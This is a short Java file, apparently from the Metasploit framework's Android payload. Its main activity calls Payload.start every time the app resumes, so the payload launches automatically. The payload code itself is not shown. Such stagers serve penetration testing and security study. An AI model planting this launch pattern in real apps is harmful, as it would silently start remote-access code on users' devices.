package com.metasploit.stage;

import android.app.Activity;

public class MainActivity extends Activity
{
    @Override
    protected void onResume() {
        super.onResume();
        Payload.start(this);
    }
}
